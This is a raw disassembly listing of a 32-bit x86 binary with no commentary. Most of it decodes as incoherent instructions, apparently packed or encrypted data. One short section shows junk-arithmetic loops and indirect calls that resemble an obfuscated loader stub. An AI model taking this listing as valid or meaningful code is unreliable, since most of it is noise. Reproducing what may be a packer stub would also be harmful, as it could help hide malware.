  406954:	repz dec ebx
  406956:	push   ecx
  406957:	aas    
  406958:	xchg   esi,eax
  406959:	jecxz  0x4068eb
  40695b:	shl    DWORD PTR [esi+0x251ca69d],1
  406961:	add    al,0x29
  406963:	les    edi,FWORD PTR [edx]
  406965:	lea    eax,[edi-0x749f5368]
  40696b:	ret    0xdf4b
  40696e:	loopne 0x4069b1
  406970:	adc    al,0xe8
  406972:	mov    eax,ds:0xcbd833b7
  406977:	imul   esp,DWORD PTR [ebx+0x67],0x43
  40697b:	loope  0x40697f
  40697d:	js     0x406932
  40697f:	xchg   esp,eax
  406980:	adc    DWORD PTR [edx-0x10384d6c],0xf3315881
  40698a:	inc    ebp
  40698b:	sbb    al,0xf6
  40698d:	sub    ebp,DWORD PTR [ebp-0x3b]
  406990:	in     al,0x57
  406992:	mov    eax,ds:0xb54c2be7
  406997:	add    eax,DWORD PTR [edi+eiz*2-0x6ba233e6]
  40699e:	ret    0x51d9
  4069a1:	lods   eax,DWORD PTR ds:[esi]
  4069a2:	sub    edi,DWORD PTR [edx+eiz*1]
  4069a5:	fs daa 
  4069a7:	push   ds
  4069a8:	movsx  ebp,BYTE PTR [ebp+0x512d1174]
  4069af:	in     al,0xf8
  4069b1:	icebp  
  4069b2:	call   0x9070:0xb3315eb1
  4069b9:	add    DWORD PTR [ecx+0x27],edi
  4069bc:	add    al,0x41
  4069be:	sub    al,dh
  4069c0:	popf   
  4069c1:	push   ecx
  4069c2:	push   eax
  4069c3:	pushf  
  4069c4:	stos   BYTE PTR es:[edi],al
  4069c5:	push   0xa9ce8a0e
  4069ca:	jmp    0x7da2:0xa1429477
  4069d1:	fs scas eax,DWORD PTR es:[edi]
  4069d3:	rcr    DWORD PTR [esi],0xee
  4069d6:	inc    edi
  4069d7:	js     0x406a2f
  4069d9:	aam    0x63
  4069db:	or     edi,DWORD PTR [ebx-0x2c]
  4069de:	mov    dl,0x6c
  4069e0:	ss fwait
  4069e2:	dec    ebp
  4069e3:	mov    DWORD PTR [ecx+0x32],esi
  4069e6:	out    0x53,eax
  4069e8:	rcl    DWORD PTR [esi],0x17
  4069eb:	stos   BYTE PTR es:[edi],al
  4069ec:	lods   al,BYTE PTR ds:[esi]
  4069ed:	mov    al,ds:0xaf961c8
  4069f2:	leave  
  4069f3:	pop    edi
  4069f4:	or     bl,BYTE PTR [edx]
  4069f6:	sbb    al,0xb5
  4069f8:	int3   
  4069f9:	pop    ss
  4069fa:	sub    al,0x2a
  4069fc:	cmp    ch,BYTE PTR [eax+esi*1-0x26f62079]
  406a03:	push   esi
  406a04:	adc    BYTE PTR [esi],0x7f
  406a07:	fs push esi
  406a09:	ds mov gs,esp
  406a0c:	mov    edx,0x2ca1ac76
  406a11:	popf   
  406a12:	ret    0xccb
  406a15:	mov    bl,0x37
  406a17:	pop    ebx
  406a18:	inc    ebp
  406a19:	mov    bl,0x2
  406a1b:	repz retf 
  406a1d:	xchg   ecx,eax
  406a1e:	out    dx,al
  406a1f:	dec    ebp
  406a20:	in     al,0x44
  406a22:	icebp  
  406a23:	jmp    0xb73f:0x52962412
  406a2a:	scas   eax,DWORD PTR es:[edi]
  406a2b:	jne    0x406a7b
  406a2d:	fs aam 0x12
  406a30:	add    dh,0xe7
  406a33:	ror    DWORD PTR [ebp-0x2c],cl
  406a36:	lods   eax,DWORD PTR ds:[esi]
  406a37:	bound  edi,QWORD PTR [ebp-0x444a31d0]
  406a3d:	aam    0xcc
  406a3f:	inc    edi
  406a40:	in     al,dx
  406a41:	call   FWORD PTR [ebp-0x42]
  406a44:	xor    eax,0x9f52ffc6
  406a49:	ret    
  406a4a:	rcr    BYTE PTR [ebx],cl
  406a4c:	test   al,0x96
  406a4e:	cmp    DWORD PTR [edi],edi
  406a50:	push   esi
  406a51:	stos   BYTE PTR es:[edi],al
  406a52:	xchg   esi,eax
  406a53:	xchg   edx,eax
  406a54:	aam    0xd6
  406a56:	mov    ebx,0xbccf9fbe
  406a5b:	push   ecx
  406a5c:	jp     0x406a85
  406a5e:	je     0x406a06
  406a60:	inc    esp
  406a61:	adc    ecx,DWORD PTR [edx]
  406a63:	jne    0x406a66
  406a65:	mov    ebp,0xf39c90ba
  406a6a:	fcmovnbe st,st(2)
  406a6c:	mov    ebp,0x2d50df06
  406a71:	inc    edi
  406a72:	ret    
  406a73:	sbb    WORD PTR [edi],si
  406a76:	xor    al,BYTE PTR [ebx-0x418d3024]
  406a7c:	loopne 0x406a43
  406a7e:	nop
  406a7f:	out    dx,eax
  406a80:	adc    esp,DWORD PTR [edi]
  406a82:	or     ch,cl
  406a84:	sahf   
  406a85:	popf   
  406a86:	cmp    al,0x9f
  406a88:	inc    ecx
  406a89:	jne    0x406b06
  406a8b:	jb     0x406a75
  406a8d:	and    BYTE PTR [eax],al
  406a8f:	push   esi
  406a90:	mov    eax,0x5b041158
  406a95:	add    BYTE PTR [ecx-0x17],dh
  406a98:	pop    ds
  406a99:	out    0xc4,al
  406a9b:	cwde   
  406a9c:	push   cs
  406a9d:	retf   0x502a
  406aa0:	js     0x406aab
  406aa2:	aad    0x38
  406aa4:	lahf   
  406aa5:	mov    ch,0x76
  406aa7:	push   ebp
  406aa8:	daa    
  406aa9:	mov    al,ds:0x14d4df5a
  406aae:	jno    0x406a53
  406ab0:	shr    DWORD PTR [ebx+esi*4],0x2b
  406ab4:	mov    gs,WORD PTR [esi-0x2f]
  406ab7:	dec    ecx
  406ab8:	cmp    eax,0x0
  406abb:	push   ecx
  406abc:	ds push 0xffffffd7
  406abf:	xchg   esi,eax
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x36
  406c9b:	imul   eax,DWORD PTR [edx],0x70c51786
  406ca1:	jo     0x406cc3
  406ca3:	jge    0x406d15
  406ca5:	jo     0x406ce9
  406ca7:	fwait
  406ca8:	sbb    bh,BYTE PTR [edx-0xd]
  406cab:	pop    ebx
  406cac:	std    
  406cad:	aas    
  406cae:	mov    al,0xa9
  406cb0:	lahf   
  406cb1:	inc    ebp
  406cb2:	lods   eax,DWORD PTR ds:[esi]
  406cb3:	in     al,dx
  406cb4:	mov    esp,0x7ede2719
  406cb9:	mov    esi,0x287df0e9
  406cbe:	test   DWORD PTR [ecx-0x13ea7ae7],0x91d99148
  406cc8:	jl     0x406cbe
  406cca:	or     edi,DWORD PTR [esi-0x76]
  406ccd:	test   al,0x19
  406ccf:	and    DWORD PTR [ecx+0x69],esi
  406cd2:	cdq    
  406cd3:	adc    bh,dh
  406cd5:	ds dec ebp
  406cd7:	(bad)  
  406cd8:	(bad)  
  406cd9:	in     eax,dx
  406cda:	mov    bl,0xf7
  406cdc:	mov    ebx,0xfd88cf54
  406ce1:	fisubr WORD PTR [eax+0xb]
  406ce4:	repz shl BYTE PTR [eax+0x46],cl
  406ce8:	inc    edx
  406ce9:	std    
  406cea:	cmp    BYTE PTR [edi+0x77],cl
  406ced:	jecxz  0x406ce4
  406cef:	xchg   DWORD PTR [esi+0x6d15dc73],edx
  406cf5:	dec    ebx
  406cf6:	jp     0x406d5f
  406cf8:	cli    
  406cf9:	dec    edi
  406cfa:	xchg   edx,eax
  406cfb:	jg     0x406d3f
  406cfd:	js     0x406ca7
  406cff:	jl     0x406d3d
  406d01:	and    DWORD PTR [ebp-0x7f],0x8457fd13
  406d08:	daa    
  406d09:	sub    al,0xf6
  406d0b:	ss pop ebx
  406d0d:	repnz ins BYTE PTR es:[edi],dx
  406d0f:	test   BYTE PTR [edi-0x6d1490b],0x68
  406d16:	scas   al,BYTE PTR es:[edi]
  406d17:	inc    edi
  406d18:	ja     0x406d59
  406d1a:	xor    DWORD PTR [ecx],edx
  406d1c:	and    BYTE PTR [ebx+ebx*1+0xc96d42],ch
  406d23:	dec    ebp
  406d24:	jg     0x406cb0
  406d26:	xchg   ecx,eax
  406d27:	and    al,0xdc
  406d29:	shl    BYTE PTR [eax-0x49260e52],0x60
  406d30:	dec    edi
  406d31:	cwde   
  406d32:	mov    ah,0x1a
  406d34:	jno    0x406d7b
  406d36:	mov    ah,0x32
  406d38:	loopne 0x406d90
  406d3a:	loope  0x406cc3
  406d3c:	sub    ecx,DWORD PTR [eax]
  406d3e:	mov    eax,ds:0x30622ac
  406d43:	xchg   BYTE PTR [ecx],bl
  406d45:	in     eax,0x72
  406d47:	jo     0x406dc0
  406d49:	mov    bh,0x67
  406d4b:	mov    esp,0xaf024c2f
  406d50:	adc    BYTE PTR [eax],0xdf
  406d53:	cmp    eax,0x5be5f63c
  406d58:	adc    DWORD PTR [eax+0x6a],edi
  406d5b:	push   ebx
  406d5c:	int    0x98
  406d5e:	mov    eax,ds:0xc86bd81d
  406d63:	pop    edi
  406d64:	cmp    ebx,0x3f
  406d67:	(bad)
  406d6a:	(bad)  
  406d6b:	cs pop ebx
  406d6d:	pop    ds
  406d6e:	stos   BYTE PTR es:[edi],al
  406d6f:	imul   ecx,DWORD PTR [esi],0xb80f66da
  406d75:	jg     0x406cfe
  406d77:	sbb    DWORD PTR [ecx+0x4e2e12de],esi
  406d7d:	scas   al,BYTE PTR es:[edi]
  406d7e:	mov    bh,0xcc
  406d80:	and    eax,0x5e750261
  406d85:	hlt    
  406d86:	xchg   bh,cl
  406d88:	addr16 jg 0x406d5b
  406d8b:	ret    0xa165
  406d8e:	shl    BYTE PTR [ebp+0x7d],cl
  406d91:	retf   
  406d92:	and    eax,0x4bb27166
  406d97:	fadd   QWORD PTR [esi]
  406d99:	outs   dx,BYTE PTR ds:[esi]
  406d9a:	push   edx
  406d9b:	fisttp WORD PTR [esi-0x18]
  406d9e:	jb     0x406e0f
  406da0:	enter  0xcc48,0x69
  406da4:	sbb    al,0xd0
  406da6:	and    eax,DWORD PTR [ecx+0x71]
  406da9:	sbb    BYTE PTR ds:0xa9905179,cl
  406daf:	rol    BYTE PTR [edx+eiz*1],1
  406db2:	mov    al,ds:0xa75565da
  406db7:	ins    DWORD PTR es:[edi],dx
  406db8:	push   eax
  406db9:	test   BYTE PTR [edi],bh
  406dbb:	jnp    0x406de2
  406dbd:	pop    ds
  406dbe:	stos   BYTE PTR es:[edi],al
  406dbf:	(bad)  
  406dc0:	jge    0x406d50
  406dc2:	sbb    dl,BYTE PTR [ebx-0x4b5d4c05]
  406dc8:	adc    DWORD PTR es:[edx],edi
  406dcb:	dec    ebp
  406dcc:	mul    edx
  406dce:	adc    BYTE PTR [ebx+0x6985c47a],dh
  406dd4:	stos   DWORD PTR es:[edi],eax
  406dd5:	sbb    al,0xac
  406dd7:	xor    ah,BYTE PTR [esp+ecx*1-0x32]
  406ddb:	popf   
  406ddc:	mov    bl,0x85
  406dde:	lahf   
  406ddf:	mov    bl,0x2d
  406de1:	pop    ebx
  406de2:	into   
  406de3:	push   ss
  406de4:	leave  
  406de5:	lock pop ds
  406de7:	dec    ebx
  406de8:	xchg   esi,eax
  406de9:	add    eax,0x66fc81ca
  406dee:	ret    
  406def:	sbb    al,0x5f
  406df1:	aaa    
  406df2:	cwde   
  406df3:	aam    0x45
  406df5:	push   es
  406df6:	mov    al,0x29
  406df8:	xchg   esp,eax
  406df9:	int    0x13
  406dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dfc:	stos   DWORD PTR es:[edi],eax
  406dfd:	sysret 
  406dff:	pop    ds
  406e00:	mov    cl,BYTE PTR [eax-0x199b6e2c]
  406e06:	outs   dx,BYTE PTR ds:[esi]
  406e07:	inc    edx
  406e08:	out    0xdd,eax
  406e0a:	or     edx,0xc259e135
  406e10:	sbb    ah,BYTE PTR [ecx+eiz*2-0x1153718d]
  406e17:	push   edi
  406e18:	int3   
  406e19:	dec    eax
  406e1a:	fsubr  st,st(0)
  406e1c:	mov    al,0x6d
  406e1e:	out    dx,al
  406e1f:	push   ebp
  406e20:	out    0x41,al
  406e22:	in     al,dx
  406e23:	outs   dx,BYTE PTR ds:[esi]
  406e24:	mov    es,WORD PTR [ebx-0xa9ed8a8]
  406e2a:	ret    0x46f9
  406e2d:	sbb    eax,0xb2667e43
  406e32:	or     DWORD PTR [edi-0x6e28c10],eax
  406e38:	jl     0x406eaf
  406e3a:	xor    BYTE PTR [ebx+0x777d1c0],cl
  406e40:	dec    ebx
  406e41:	stc    
  406e42:	pop    eax
  406e43:	lds    esi,FWORD PTR [eax]
  406e45:	sub    edi,DWORD PTR [eax+0x39]
  406e48:	push   ecx
  406e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e4a:	adc    cl,BYTE PTR [ebx-0x4b6d374d]
  406e50:	xchg   edi,eax
  406e51:	pop    ebp
  406e52:	cs push 0x7b
  406e55:	push   edi
  406e56:	js     0x406ea6
  406e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e59:	push   edx
  406e5a:	jae    0x406ed0
  406e5c:	bound  ebx,QWORD PTR [ebx]
  406e5e:	sbb    dh,bh
  406e60:	pop    esi
  406e61:	nop
  406e62:	cmp    al,0xe7
  406e64:	bound  edi,QWORD PTR [edi+0x6a]
  406e67:	ret    
  406e68:	xchg   ebp,eax
  406e69:	sub    BYTE PTR [ecx],cl
  406e6b:	(bad)  
  406e6c:	or     DWORD PTR [eax],ebp
  406e6e:	add    eax,0x4dfb74a0
  406e73:	jl     0x406ee1
  406e75:	int3   
  406e76:	icebp  
  406e77:	lds    edi,FWORD PTR [eax]
  406e79:	pop    es
  406e7a:	scas   eax,DWORD PTR es:[edi]
  406e7b:	js     0x406e65
  406e7d:	inc    esi
  406e7e:	add    BYTE PTR [ebx+0x1],al
  406e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e83:	gs scas eax,DWORD PTR es:[edi]
  406e85:	or     DWORD PTR [eax+ebp*8-0x74bf6f67],esp
  406e8c:	cmp    BYTE PTR [ebx-0x5ccb8edd],dh
  406e92:	rcr    DWORD PTR [ebx-0x11fe1107],0x6f
  406e99:	(bad)  
  406e9b:	cs mov bh,0x69
  406e9e:	jecxz  0x406e7f
  406ea0:	jge    0x406e3d
  406ea2:	jo     0x406ecf
  406ea4:	pop    ebx
  406ea5:	lods   al,BYTE PTR ds:[esi]
  406ea6:	and    al,0xff
  406ea8:	fcom   QWORD PTR [ecx-0x3fd0926e]
  406eae:	pop    ebx
  406eaf:	sub    al,0x7c
  406eb1:	imul   eax,ebp,0xffffffc5
  406eb4:	ror    BYTE PTR [ecx+0x31f1e826],0xd7
  406ebb:	mov    bl,0xb8
  406ebd:	fdiv   st,st(3)
  406ebf:	xchg   ecx,eax
  406ec0:	jmp    0x4361:0xb82f5f59
  406ec7:	cmc    
  406ec8:	xchg   edx,eax
  406ec9:	sbb    cl,BYTE PTR [eax-0xb7e615e]
  406ecf:	scas   eax,DWORD PTR es:[edi]
  406ed0:	pop    esp
  406ed1:	mov    ecx,0xded5ba31
  406ed6:	inc    esp
  406ed7:	dec    ebp
  406ed8:	cmp    DWORD PTR [eax-0x28],edi
  406edb:	push   ss
  406edc:	inc    ebp
  406edd:	adc    BYTE PTR [esi+ebx*8+0x7],bl
  406ee1:	mov    ch,0xab
  406ee3:	xchg   dh,cl
  406ee5:	sti    
  406ee6:	pushf  
  406ee7:	cmp    DWORD PTR [edi],esp
  406ee9:	pop    ebp
  406eea:	sbb    eax,0xa0a82bd7
  406eef:	or     eax,0xd5243daf
  406ef4:	data16 mov dh,0xc0
  406ef7:	in     eax,0x47
  406ef9:	lock hlt 
  406efb:	das    
  406efc:	ret    
  406efd:	xor    eax,0x304c67db
  406f02:	bound  ebx,QWORD PTR [ecx+0x55]
  406f05:	lea    eax,ds:0x8886c5a3
  406f0b:	inc    ecx
  406f0c:	scas   al,BYTE PTR es:[edi]
  406f0d:	jmp    0x406eb8
  406f0f:	dec    esi
  406f10:	or     edi,DWORD PTR [edx+0x59]
  406f13:	retf   0x7223
  406f16:	dec    ebx
  406f17:	test   al,0x4b
  406f19:	inc    esp
  406f1a:	nop
  406f1b:	stos   BYTE PTR es:[edi],al
  406f1c:	(bad)  
  406f1d:	mov    ?,ebx
  406f1f:	and    ebx,ebx
  406f21:	ror    BYTE PTR [ebp-0xaa61520],cl
  406f27:	jmp    0x60ff:0xf4a71db8
  406f2e:	xchg   eax,esi
  406f30:	fsubr  QWORD PTR [edx-0x2adfc83]
  406f36:	fiadd  DWORD PTR [ecx+0x26bec164]
  406f3c:	fsubr  QWORD PTR [ebp-0x37]
  406f3f:	ins    BYTE PTR es:[edi],dx
  406f40:	clc    
  406f41:	cld    
  406f42:	cmp    ch,ch
  406f44:	cmp    BYTE PTR [esi],cl
  406f46:	sbb    DWORD PTR [ebx],edx
  406f48:	jle    0x406f45
  406f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4b:	push   ebp
  406f4c:	lods   eax,DWORD PTR ds:[esi]
  406f4d:	xor    dl,bh
  406f4f:	sub    eax,0x610bc5e0
  406f54:	adc    esp,0x2080907f
  406f5a:	in     eax,0x7f
  406f5c:	out    dx,al
  406f5d:	js     0x406fc3
  406f5f:	cld    
  406f60:	pushf  
  406f61:	xlat   BYTE PTR ds:[ebx]
  406f62:	lods   eax,DWORD PTR ds:[esi]
  406f63:	xchg   ebx,eax
  406f64:	(bad)  
  406f65:	and    ch,BYTE PTR [ebx]
  406f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f68:	pop    edi
  406f69:	cmp    DWORD PTR [eax-0x7f535566],edx
  406f6f:	xor    cl,BYTE PTR [edx]
  406f71:	stos   BYTE PTR es:[edi],al
  406f72:	stos   DWORD PTR es:[edi],eax
  406f73:	mov    edi,0xba71f28a
  406f78:	add    BYTE PTR [eax],bl
  406f7a:	inc    ecx
  406f7b:	jns    0x406fdb
  406f7d:	cwde   
  406f7e:	les    esp,FWORD PTR [edx-0x55918204]
  406f84:	ins    DWORD PTR es:[edi],dx
  406f85:	fcmovnu st,st(4)
  406f87:	jnp    0x406fba
  406f89:	hlt    
  406f8a:	jg     0x406f68
  406f8c:	jl     0x406f89
  406f8e:	sub    eax,DWORD PTR [edi-0x440431a9]
  406f94:	xor    DWORD PTR [ecx+0x49f595e4],eax
  406f9a:	and    esp,DWORD PTR [edi-0x4e373ba8]
  406fa0:	test   al,0xe3
  406fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa3:	fcomi  st,st(3)
  406fa5:	js     0x406f7f
  406fa7:	aad    0x9a
  406fa9:	xchg   edi,eax
  406faa:	retf   0x6bf9
  406fad:	cld    
  406fae:	call   0xfe05:0x9537db21
  406fb5:	add    BYTE PTR [edx-0x4f157674],dl
  406fbb:	mov    ds:0x534d606d,al
  406fc0:	xchg   BYTE PTR [edx+0x35f5200d],bh
  406fc6:	repz sub bl,dl
  406fc9:	mov    WORD PTR [ecx+0x59039c53],?
  406fcf:	push   ebp
  406fd0:	sbb    eax,0x3cf9d998
  406fd5:	inc    edi
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx-0x380e616d],dx
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407061
  407018:	and    esp,DWORD PTR [edi-0x258cf890]
  40701e:	scas   eax,DWORD PTR es:[edi]
  40701f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407020:	outs   dx,BYTE PTR ds:[esi]
  407021:	cmp    BYTE PTR [ecx+ecx*8+0x18],0xa5
  407026:	jl     0x407020
  407028:	adc    esi,DWORD PTR [ebx+edi*8-0x15ee0cf5]
  40702f:	xchg   esi,eax
  407030:	iret   
  407031:	mov    ss,WORD PTR [esi]
  407033:	xchg   edx,eax
  407034:	jmp    0x4070a3
  407036:	fcomp  DWORD PTR [ecx-0x578490f0]
  40703c:	xor    ch,BYTE PTR [ecx]
  40703e:	das    
  40703f:	fldcw  WORD PTR [edi+ecx*2-0x5c3beff]
  407046:	bound  esp,QWORD PTR [eax+0x585481f5]
  40704c:	test   BYTE PTR [esi-0x2d],0x73
  407050:	cdq    
  407051:	or     DWORD PTR [esi-0x66],esp
  407054:	push   esp
  407055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407056:	ins    BYTE PTR es:[edi],dx
  407057:	iret   
  407058:	add    bl,dl
  40705a:	inc    esp
  40705b:	in     al,dx
  40705c:	push   esi
  40705d:	in     al,dx
  40705e:	inc    eax
  40705f:	cmp    BYTE PTR [eax+0x6a],dl
  407062:	sub    edi,esp
  407064:	mov    cl,0xa1
  407066:	shr    bp,cl
  407069:	xchg   BYTE PTR [ebp+0x178cbd41],dh
  40706f:	ret    0x1ab0
  407072:	mov    esi,0x43a7c51b
  407077:	(bad)  
  407078:	mov    ds:0xedf38266,eax
  40707d:	or     al,0x6b
  40707f:	push   esi
  407080:	ss (bad) 
  407082:	enter  0x5b3b,0x17
  407086:	enter  0x604e,0x99
  40708a:	or     BYTE PTR [ecx-0x784ece69],cl
  407090:	retf   0x5698
  407093:	ret    0x37f4
  407096:	mov    bl,0x32
  407098:	outs   dx,DWORD PTR ds:[esi]
  407099:	dec    ebx
  40709a:	push   edx
  40709b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40709d:	inc    edx
  40709e:	jns    0x4070e7
  4070a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070a1:	hlt    
  4070a2:	lods   eax,DWORD PTR ds:[esi]
  4070a3:	in     al,0xd9
  4070a5:	inc    ecx
  4070a6:	and    al,0x35
  4070a8:	(bad)  
  4070a9:	xor    BYTE PTR [ecx-0x7e],al
  4070ac:	mov    ah,0x81
  4070ae:	cmp    eax,0x9e1db3bb
  4070b3:	(bad)
  4070b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070b7:	pop    ecx
  4070b8:	add    dh,bl
  4070ba:	adc    BYTE PTR [ebx+0x59f5fd3c],cl
  4070c0:	add    BYTE PTR [edi-0x30251319],bh
  4070c6:	int3   
  4070c7:	int    0x88
  4070c9:	adc    DWORD PTR [edx],0xffffff91
  4070cc:	and    bh,BYTE PTR [ebx-0x7a]
  4070cf:	mov    ds:0xb11d3a82,al
  4070d4:	stos   BYTE PTR es:[edi],al
  4070d5:	jno    0x40714b
  4070d7:	xchg   BYTE PTR [ebp-0x365ecc79],ah
  4070dd:	xchg   edi,eax
  4070de:	je     0x407129
  4070e0:	(bad)  
  4070e2:	and    eax,0xd5301a61
  4070e7:	pop    ss
  4070e8:	add    ecx,DWORD PTR [edi+0x68]
  4070eb:	pop    ebx
  4070ec:	jmp    0x5fc7ebd4
  4070f1:	pcmpeqb mm2,QWORD PTR [ebx-0x3346d3b4]
  4070f8:	pop    eax
  4070f9:	xchg   BYTE PTR [ebp+0x74c75e63],bh
  4070ff:	jge    0x407127
  407101:	jl     0x4070f4
  407103:	jnp    0x4070f7
  407105:	sub    DWORD PTR [esi],0xa11ae27f
  40710b:	jle    0x4070e9
  40710d:	enter  0x36b1,0xe9
  407111:	jo     0x407168
  407113:	sub    BYTE PTR [edx+0x74],bl
  407116:	jmpw   0xfc5f
  40711a:	pop    ebp
  40711b:	outs   dx,DWORD PTR ds:[esi]
  40711c:	les    ebx,FWORD PTR [eax-0x77]
  40711f:	cdq    
  407120:	mov    esi,0x35e1980c
  407125:	xor    eax,0xbe5436d
  40712a:	dec    ebx
  40712b:	or     al,0xe8
  40712d:	jmp    0x6733:0xe00845f4
  407134:	cmp    al,0x33
  407136:	xlat   BYTE PTR ds:[ebx]
  407137:	pusha  
  407138:	popa   
  407139:	dec    ebx
  40713a:	dec    edi
  40713b:	or     edi,0xe4721b68
  407141:	iret   
  407142:	or     ebx,DWORD PTR [ebx]
  407144:	jae    0x4070f2
  407146:	fsubr  st(2),st
  407148:	sbb    BYTE PTR [ecx],0x1b
  40714b:	aaa    
  40714c:	sub    eax,0x53fa3bbd
  407151:	hlt    
  407152:	repnz inc eax
  407154:	je     0x407101
  407156:	(bad)  
  407157:	xor    ebx,DWORD PTR [ebp+eiz*4+0x33770b1f]
  40715e:	adc    al,0xe
  407160:	(bad)  [ebp-0x13]
  407163:	sbb    esi,DWORD PTR [edi+0x60846f17]
  407169:	sar    dh,cl
  40716b:	out    0x10,al
  40716d:	nop
  40716e:	enter  0x9346,0x12
  407172:	mov    al,ds:0x248e198a
  407177:	dec    edi
  407178:	(bad)  
  407179:	mov    DWORD PTR [edi],ecx
  40717b:	outs   dx,DWORD PTR ds:[esi]
  40717c:	dec    edi
  40717d:	or     eax,0x51031d2d
  407182:	inc    edx
  407183:	lock sti 
  407185:	(bad)  
  407186:	jmp    0x407161
  407188:	aas    
  407189:	or     bh,BYTE PTR [eax]
  40718b:	add    DWORD PTR [esi+eax*1+0x20348477],edi
  407192:	pusha  
  407193:	push   es
  407194:	mov    dl,0x21
  407196:	inc    eax
  407197:	aaa    
  407198:	add    eax,0x35d716a6
  40719d:	xchg   ecx,eax
  40719e:	cmp    BYTE PTR [edx-0x34edc518],bh
  4071a4:	enter  0x5092,0x7
